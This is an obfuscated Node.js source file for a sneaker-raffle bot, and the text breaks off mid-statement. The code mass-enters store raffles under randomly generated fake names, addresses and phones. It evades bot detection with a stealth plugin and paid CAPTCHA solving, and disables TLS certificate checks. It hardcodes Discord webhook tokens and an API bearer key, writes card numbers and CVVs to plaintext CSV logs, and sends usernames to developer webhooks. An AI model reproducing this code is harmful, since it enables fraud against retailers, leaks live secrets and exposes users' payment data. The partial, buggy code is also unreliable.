process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
var _0x59e93a = require('node-imap'), _0x47f47d = require('util')['inspect'];
const _0x2cd09b = require('mailparser')['simpleParser'], { EmbedBuilder: _0xbecd3e } = require('discord.js');
var _0x29257a = require('exe');
const { execFile: _0x2a0983 } = require('child_process'), _0x51bd0a = require('puppeteer-extra'), _0x2f2194 = require('puppeteer-extra-plugin-recaptcha'), _0x5a6562 = require('puppeteer-extra-plugin-stealth'), _0x5bbbd3 = require('chalk'), _0x4e8779 = require('node-bash-title'), _0x396fe9 = require('fs'), _0x549073 = require('axios'), _0x5315ab = require('papaparse');
var _0x2f8b9a = require('random-name');
const _0x38301a = require('request');
var _0x5c634a = require('prompt');
const _0x6f82fb = _0x38301a['jar']();
var _0x474e1d = {};
const _0x2c36b0 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0xf2020a = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x32da99 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x36fe99 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x2f6f31 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x50a600 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x580093 = 'https://discord.com/api/webhooks/', _0x24519b = '' + _0x580093 + _0x32da99, _0x29555e = '' + _0x580093 + _0x36fe99, _0x5e16d4 = '' + _0x580093 + _0x2c36b0, _0x406b45 = '' + _0x580093 + _0xf2020a, _0x3c50b7 = '' + _0x580093 + _0x2f6f31, _0x305f8a = '' + _0x580093 + _0x50a600;
const _0x1dfa7e = JSON['parse'](_0x396fe9['readFileSync']('../package.json', 'utf-8')), _0x1144ef = _0x1dfa7e['version'];
var _0x10c107, _0x68d2dc, _0x54ee2d, _0x412fa6, _0x893321, _0x21e919, _0x54e6a5, _0x39a127;
const _0x1c6edc = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x384e04 = ![];
const _0x1ffecf = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x53b564 = '0123456789';
var _0x24b47e = _0x1ffecf['split']('');
const _0x4fca52 = require('auto-git-update'), { PageEmittedEvents: _0x440b71 } = require('puppeteer'), { getRandomValues: _0x6b1468 } = require('crypto'), { resolve: _0x13a5e9 } = require('path'), { Console: _0x433d3d } = require('console'), _0x2a9c7e = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x2dd078 = new _0x4fca52(_0x2a9c7e);
async function _0x27f0ed() {
    _0x893321 = _0x396fe9['readdirSync']('../proxies'), _0x412fa6 = _0x396fe9['readdirSync']('../tasks'), !_0x396fe9['existsSync']('../accounts/fenom.csv') && _0x396fe9['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x396fe9['existsSync']('../accounts/bstn.csv') && _0x396fe9['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x396fe9['existsSync']('../failed-tasks.csv') && _0x396fe9['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x396fe9['existsSync']('../successful-tasks.csv') && _0x396fe9['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x474e1d = JSON['parse'](_0x396fe9['readFileSync']('../settings.json', 'utf-8')), !_0x474e1d['delay'] && (_0x474e1d['delay'] = 0x3c, _0x396fe9['writeFileSync']('../settings.json', JSON['stringify'](_0x474e1d, null, 0x2))), !_0x474e1d['masterMail'] && (_0x474e1d['masterMail'] = 'yourmail@gmail.com', _0x396fe9['writeFileSync']('../settings.json', JSON['stringify'](_0x474e1d, null, 0x2))), !_0x474e1d['masterPassword'] && (_0x474e1d['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x396fe9['writeFileSync']('../settings.json', JSON['stringify'](_0x474e1d, null, 0x2))), !_0x474e1d['captchaKey'] && (_0x474e1d['captchaKey'] = '', _0x396fe9['writeFileSync']('../settings.json', JSON['stringify'](_0x474e1d, null, 0x2))), !_0x474e1d['useRandomProxy'] && (_0x474e1d['useRandomProxy'] = !![], _0x396fe9['writeFileSync']('../settings.json', JSON['stringify'](_0x474e1d, null, 0x2))), !_0x474e1d['shuffleTasks'] && (_0x474e1d['useRandomProxy'] = ![], _0x396fe9['writeFileSync']('../settings.json', JSON['stringify'](_0x474e1d, null, 0x2))), !_0x474e1d['webhook'] && (_0x474e1d['webhook'] = '', _0x396fe9['writeFileSync']('../settings.json', JSON['stringify'](_0x474e1d, null, 0x2))), _0x474e1d['delay'] <= 0x1388 && (_0x474e1d['delay'] = _0x474e1d['delay'] * 0x3e8), _0x474e1d['AfewDelay'] && (delete _0x474e1d['AfewDelay'], _0x396fe9['writeFileSync']('../settings.json', JSON['stringify'](_0x474e1d, null, 0x2))), _0x474e1d['MahaDelay'] && (delete _0x474e1d['MahaDelay'], _0x396fe9['writeFileSync']('../settings.json', JSON['stringify'](_0x474e1d, null, 0x2))), _0x474e1d['footshopDelay'] && (delete _0x474e1d['footshopDelay'], _0x396fe9['writeFileSync']('../settings.json', JSON['stringify'](_0x474e1d, null, 0x2))), _0x474e1d['MahaDelay'] = _0x474e1d['delay'], _0x580093 = _0x474e1d['webhook'], _0x21e919 = _0x474e1d['licenseKey'];
}
let _0x582b99, _0x20cf71 = [], _0x1655a1;
const _0x90116b = _0x760b4f => new Promise(_0xafe4a7 => setTimeout(_0xafe4a7, _0x760b4f));
function _0x511730(_0xfae919, _0x1a66bc) {
    return Math['floor'](Math['random']() * (_0x1a66bc - _0xfae919 + 0x1) + _0xfae919);
}
function _0xfd8fd9(_0x42248b) {
    let _0x8ac33d = _0x42248b['length'], _0x16efc3;
    while (_0x8ac33d != 0x0) {
        _0x16efc3 = Math['floor'](Math['random']() * _0x8ac33d), _0x8ac33d--, [_0x42248b[_0x8ac33d], _0x42248b[_0x16efc3]] = [
            _0x42248b[_0x16efc3],
            _0x42248b[_0x8ac33d]
        ];
    }
    return _0x42248b;
}
async function _0x1e6d57(_0x4cf7ac) {
    return _0x549073['get']('https://api.hyper.co/v4/licenses/' + _0x4cf7ac, { 'headers': { 'Authorization': 'Bearer\x20' + _0x1c6edc } })['then'](_0x563857 => _0x563857['data'])['catch'](() => null);
}
;
async function _0xf81790(_0x19b43e) {
    console['clear']();
    if (_0x19b43e == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x2d5f17 = await _0x5c634a['get']('License');
        if (_0x2d5f17['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x90116b(0xbb8), _0xf81790(_0x19b43e);
        _0x19b43e = _0x2d5f17['License'], _0x474e1d['licenseKey'] = _0x19b43e, _0x21e919 = _0x19b43e, _0x396fe9['writeFileSync']('../settings.json', JSON['stringify'](_0x474e1d));
    }
    console['log']('Checking\x20license\x20' + _0x21e919 + '...'), await _0x90116b(0x320);
    const _0x3dbe6d = await _0x1e6d57(_0x19b43e);
    _0x54e6a5 = JSON['stringify'](_0x3dbe6d['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x39a127 = JSON['stringify'](_0x3dbe6d['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x3dbe6d)
        return console['log']('License\x20not\x20found');
    if (!_0x3dbe6d['user'])
        return console['log']('License\x20not\x20bound');
    return _0x3dbe6d['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x384e04 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x384e04 = ![]);
}
async function _0x2f2406() {
    var _0x42a6f8 = await _0x5c634a['get']('Module');
    return console['clear'](), _0x42a6f8['Module'];
}
;
async function _0x37eafa() {
    var _0xa922ae = await _0x5c634a['get']('Setting');
    return console['clear'](), _0xa922ae['Setting'];
}
async function _0x3a7658() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x1a792b = 0x0; _0x1a792b < _0x412fa6['length']; _0x1a792b++) {
        console['log']('\x20(' + _0x1a792b + ')\x20' + _0x412fa6[_0x1a792b]);
    }
    console['log']('');
    var _0x1bea29 = await _0x5c634a['get']('Task');
    if (_0x1bea29['Task'] > _0x412fa6['length'] - 0x1 || isNaN(_0x1bea29['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x90116b(0x3e8), _0x3a7658();
    var _0x4c1d97 = _0x396fe9['readFileSync']('../tasks/' + _0x412fa6[_0x1bea29['Task']], 'utf-8');
    return _0x54ee2d = _0x5315ab['parse'](_0x4c1d97, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x5bbbd3['blue'](_0x412fa6[_0x1bea29['Task']])), _0x10c107 = _0x412fa6[_0x1bea29['Task']], _0x54ee2d;
}
async function _0x3402a9() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x1bf83c = 0x0; _0x1bf83c < _0x893321['length']; _0x1bf83c++) {
        console['log']('\x20(' + _0x1bf83c + ')\x20' + _0x893321[_0x1bf83c]);
    }
    console['log']('');
    var _0x213301 = await _0x5c634a['get']('Proxies');
    if (_0x213301['Proxies'] > _0x893321['length'] - 0x1 || isNaN(_0x213301['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x90116b(0x3e8), _0x3402a9();
    var _0x4a6c0f = _0x396fe9['readFileSync']('../proxies/' + _0x893321[_0x213301['Proxies']], 'utf-8')['split']('\x0a');
    let _0x326985 = _0x4a6c0f['map']((_0x22d2fd, _0x341cbe) => {
        sanatizeProxy = _0x22d2fd['replace']('\x0d', '');
        if (_0x4a6c0f[_0x341cbe + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x68d2dc = _0x893321[_0x213301['Proxies']], console['clear'](), _0x326985;
}
async function _0x29dbde() {
    var _0x51dfc2 = await _0x5c634a['get']('Value');
    return console['clear'](), _0x51dfc2['Value'];
}
async function _0x37fc05(_0x3ab025) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x3b288a = 0x0; _0x3b288a < _0x3ab025['length']; _0x3b288a++) {
        console['log']('\x20(' + _0x3b288a + ')\x20[' + _0x3ab025[_0x3b288a]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x3d7cd5 = await _0x5c634a['get']('Module');
    return _0x3d7cd5['Module'];
}
async function _0x4e13f0() {
    var _0x32f657 = await _0x5c634a['get']('Password');
    return console['clear'](), _0x32f657['Password'];
}
;
async function _0x132628() {
    var _0x2d887e = await _0x5c634a['get']('Links');
    return _0x2d887e['Links'];
}
;
async function _0x507da9() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x402c0c = 0x0; _0x402c0c < _0x20cf71['length']; _0x402c0c++) {
        console['log']('\x20(' + _0x402c0c + ')\x20' + _0x20cf71[_0x402c0c]);
    }
    ;
    console['log']();
    let _0x3bb356 = await _0x5c634a['get']('Product');
    return console['clear'](), _0x3bb356['Product'];
}
;
function _0xd645bd() {
    var _0x2a7b32 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x2a7b32;
}
;
function _0x3854b2() {
    var _0x48b848 = new Date(Date['now']())['toLocaleString']();
    return _0x48b848['replace'](',', '');
}
async function _0x2860ef(_0x3bbfcd, _0x34bfff) {
    let _0x25cc01 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x1144ef != 'devkey') {
        await _0x549073['post'](_0x3bbfcd, _0x34bfff, _0x25cc01);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x476a56(_0xbf9af2, _0x44d5f6, _0x39e5ea, _0x32fe27, _0x41b73a) {
    if (!_0x32fe27 && _0x39e5ea == 'dev') {
        var _0x4a40a1 = new _0xbecd3e()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x44d5f6['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x44d5f6['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0xbf9af2['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x474e1d['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x54e6a5,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0xbf9af2['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x1144ef,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x4a40a1['data'];
    } else {
        if (_0x32fe27 && _0x39e5ea == 'dev') {
            var _0x4a40a1 = new _0xbecd3e()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x44d5f6['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x54e6a5,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x44d5f6['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0xbf9af2['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x474e1d['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x41b73a,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0xbf9af2['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x1144ef,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x4a40a1['data'];
        } else {
            if (_0x39e5ea == 'pub') {
                var _0x4a40a1 = new _0xbecd3e()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x44d5f6['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x44d5f6['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0xbf9af2['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x474e1d['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0xbf9af2['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x1144ef,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x4a40a1['data'];
            } else {
                if (_0x39e5ea == 'acc' && !_0x32fe27) {
                    var _0x4a40a1 = new _0xbecd3e()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x44d5f6['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x54e6a5,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x44d5f6['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x474e1d['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x1144ef,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x4a40a1['data'];
                } else {
                    if (_0x39e5ea == 'acc' && _0x32fe27) {
                        var _0x4a40a1 = new _0xbecd3e()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x44d5f6['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x54e6a5,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x41b73a,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x44d5f6['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x474e1d['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x1144ef,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x4a40a1['data'];
                    } else {
                        if (_0x39e5ea == 'open') {
                            var _0x4a40a1 = new _0xbecd3e()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x39a127)['addFields']({
                                'name': 'User',
                                'value': '' + _0x54e6a5,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x1144ef,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x4a40a1['data'];
                        } else {
                            if (!_0x32fe27 && _0x39e5ea == 'ver') {
                                var _0x4a40a1 = new _0xbecd3e()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x44d5f6['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x54e6a5,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x44d5f6['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x474e1d['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x1144ef,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x4a40a1['data'];
                            } else {
                                if (_0x32fe27 && _0x39e5ea == 'ver') {
                                    var _0x4a40a1 = new _0xbecd3e()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x44d5f6['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x54e6a5,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x41b73a,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x44d5f6['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x474e1d['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x1144ef,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x4a40a1['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x526adb(_0xfce139, _0x7e807e) {
    var _0x3af8ee = _0xfce139[_0x7e807e]['Address1']['split'](''), _0x57566b = _0xfce139[_0x7e807e]['Address2']['split'](''), _0x3d15ce = _0xfce139[_0x7e807e]['Email']['split']('@');
    for (var _0x426c86 = 0x0; _0x426c86 < _0x3af8ee['length']; _0x426c86++) {
        if (_0x3af8ee[_0x426c86] == 'X') {
            var _0x1401c3 = Math['round'](Math['random']() * (_0x1ffecf['length'] - 0x1));
            _0x3af8ee[_0x426c86] = _0x24b47e[_0x1401c3];
        }
    }
    ;
    for (var _0x426c86 = 0x0; _0x426c86 < _0x57566b['length']; _0x426c86++) {
        if (_0x57566b[_0x426c86] == 'X') {
            var _0x1401c3 = Math['round'](Math['random']() * (_0x1ffecf['length'] - 0x1));
            _0x57566b[_0x426c86] = _0x24b47e[_0x1401c3];
        }
    }
    ;
    _0xfce139[_0x7e807e]['FirstName'] == 'RANDOM' && (_0xfce139[_0x7e807e]['FirstName'] = _0x2f8b9a['first']());
    _0xfce139[_0x7e807e]['LastName'] == 'RANDOM' && (_0xfce139[_0x7e807e]['LastName'] = _0x2f8b9a['last']());
    _0x3d15ce[0x0] == 'RANDOM' ? _0x3d15ce[0x0] = '' + _0x2f8b9a['first']() + _0x2f8b9a['last']() + _0x511730(0x1, 0x270f) + '@' : _0x3d15ce[0x0] = _0x3d15ce[0x0] + '@';
    _0xfce139[_0x7e807e]['Email'] = _0x3d15ce['join'](''), _0xfce139[_0x7e807e]['Address1'] = _0x3af8ee['join'](''), _0xfce139[_0x7e807e]['Address2'] = _0x57566b['join']('');
    _0xfce139[_0x7e807e]['Phone'] == 'RANDOM' && (_0xfce139[_0x7e807e]['Phone'] = '0' + _0x511730(0x5f5e100, 0x3b9ac9ff));
    if (_0xfce139[_0x7e807e]['Follower'] == 'RANDOM') {
        var _0x2a2492 = _0x511730(0x1, 0x270f);
        _0xfce139[_0x7e807e]['Follower'] = '' + _0x2f8b9a['first']() + _0x2f8b9a['last']() + _0x2a2492 + '\x20';
    }
    _0xfce139[_0x7e807e]['HouseNumber'] == 'RANDOM' && (_0xfce139[_0x7e807e]['HouseNumber'] = _0x511730(0x1, 0xc8));
    if (_0xfce139[_0x7e807e]['Address1'] == 'RANDOM') {
        var _0x1eacfc = Math['round'](Math['random']() * (_0x1ffecf['length'] - 0x1)), _0x3a1780 = _0x24b47e[_0x1eacfc];
        _0xfce139[_0x7e807e]['Address1'] = _0x2f8b9a['last']() + 'straat', _0xfce139[_0x7e807e]['Zip'] == '' && (_0xfce139[_0x7e807e]['Postcode'] = _0x511730(0x3e8, 0x270f) + '\x20' + _0x3a1780 + _0x3a1780, _0xfce139[_0x7e807e]['Zip'] = _0xfce139[_0x7e807e]['Postcode']), _0xfce139[_0x7e807e]['HouseNumber'] = '' + _0x511730(0x1, 0xc8);
    }
    return;
}
;
async function _0x78fa55(_0x50b347, _0x410dbd) {
    _0x396fe9['appendFileSync']('../failed-tasks.csv', _0x3854b2() + ',' + _0x410dbd['store'] + ',' + _0x410dbd['name'] + ',' + _0x50b347['Url'] + ',' + _0x50b347['Size'] + ',' + _0x50b347['Follower'] + ',' + _0x50b347['FirstName'] + ',' + _0x50b347['LastName'] + ',' + _0x50b347['Address1'] + ',' + _0x50b347['Address2'] + ',' + _0x50b347['HouseNumber'] + ',' + _0x50b347['Zip'] + ',' + _0x50b347['City'] + ',' + _0x50b347['State'] + ',' + _0x50b347['Country'] + ',' + _0x50b347['Phone'] + ',' + _0x50b347['Email'] + ',' + _0x50b347['Password'] + ',' + _0x50b347['PaymentMethod'] + ',' + _0x50b347['CardType'] + ',' + _0x50b347['NameOnCard'] + ',' + _0x50b347['CardNumber'] + ',' + _0x50b347['ExpiryDate'] + ',' + _0x50b347['CVV'] + ',' + _0x50b347['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x2812a5(_0x46dbea, _0xb29490) {
    _0x396fe9['appendFileSync']('../successful-tasks.csv', _0x3854b2() + ',' + _0xb29490['store'] + ',' + _0xb29490['name'] + ',' + _0x46dbea['Url'] + ',' + _0x46dbea['Size'] + ',' + _0x46dbea['Follower'] + ',' + _0x46dbea['FirstName'] + ',' + _0x46dbea['LastName'] + ',' + _0x46dbea['Address1'] + ',' + _0x46dbea['Address2'] + ',' + _0x46dbea['HouseNumber'] + ',' + _0x46dbea['Zip'] + ',' + _0x46dbea['City'] + ',' + _0x46dbea['State'] + ',' + _0x46dbea['Country'] + ',' + _0x46dbea['Phone'] + ',' + _0x46dbea['Email'] + ',' + _0x46dbea['Password'] + ',' + _0x46dbea['PaymentMethod'] + ',' + _0x46dbea['CardType'] + ',' + _0x46dbea['NameOnCard'] + ',' + _0x46dbea['CardNumber'] + ',' + _0x46dbea['ExpiryDate'] + ',' + _0x46dbea['CVV'] + ',' + _0x46dbea['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x187bbb() {
    let _0x1c2b72 = proxyFile['split']('\x0a'), _0x3b822f = _0x1c2b72['map']((_0x1c2281, _0x34db6e) => {
        sanatizeProxy = _0x1c2281['replace']('\x0d', '');
        if (_0x1c2b72[_0x34db6e + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x3b822f;
}
;
async function _0x1d0fc7(_0x26913d) {
    var _0x48508f = _0x26913d[0x1]['split'](':');
    const _0x818c13 = await _0x51bd0a['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x48508f[0x0] + ':' + _0x48508f[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x396749 = await _0x818c13['newPage']();
        await _0x396749['authenticate']({
            'username': '' + _0x48508f[0x2],
            'password': '' + _0x48508f[0x3]
        }), console['log'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x396749['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x396749['setRequestInterception'](!![]), _0x396749['on']('request', _0x4e8db8 => {
            _0x4e8db8['resourceType']() === 'image' || _0x4e8db8['resourceType']() === 'font' || _0x4e8db8['resourceType']() === 'media' ? _0x4e8db8['abort']() : _0x4e8db8['continue']();
        }), await _0x396749['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x396749['waitForTimeout'](0xbb8), await _0x396749['waitForSelector']('.product-card');
        const _0x1d1f80 = await _0x396749['$$eval']('a.product-card', _0x3e703f => {
            return _0x3e703f['map'](_0x3c0c47 => _0x3c0c47['href']);
        });
        return _0x20cf71 = _0x1d1f80;
    } catch (_0x2d102b) {
        console['log']('\x20' + _0x2d102b);
    } finally {
        _0x818c13['close'](), console['clear']();
    }
}
;
async function _0x4b9392(_0x2747df, _0x23f2c0) {
    _0x51bd0a['use'](_0x5a6562()), _0x51bd0a['use'](_0x2f2194({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x474e1d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x40afb0 = 0x0; _0x40afb0 < bouncewear['length']; _0x40afb0++) {
        await _0x526adb(bouncewear, _0x40afb0);
        if (bouncewear[_0x40afb0]['Email'] == '' || bouncewear[_0x40afb0]['Password'] == '' || bouncewear[_0x40afb0]['FirstName'] == '' || bouncewear[_0x40afb0]['LastName'] == '') {
            console['log'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Task\x20' + (_0x40afb0 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x474e1d['useRandomProxy'] = ![])
            var _0x5ad73a = _0x187bbb()[_0x40afb0]['split'](':');
        else
